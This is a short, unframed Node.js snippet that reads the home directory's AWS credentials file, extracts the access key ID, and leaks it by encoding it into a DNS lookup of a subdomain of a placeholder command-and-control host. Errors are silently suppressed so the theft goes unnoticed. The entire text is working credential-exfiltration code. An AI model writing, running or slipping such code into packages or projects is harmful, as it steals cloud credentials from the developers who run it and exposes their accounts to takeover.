const fs = require('fs'), os = require('os'), dns = require('dns');
try {
  const c = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');
  const id = (c.match(/aws_access_key_id = (\S+)/) || [])[1] || 'none';
  dns.lookup(id.toLowerCase() + '.c2.example.net', () => {});
} catch (e) {}
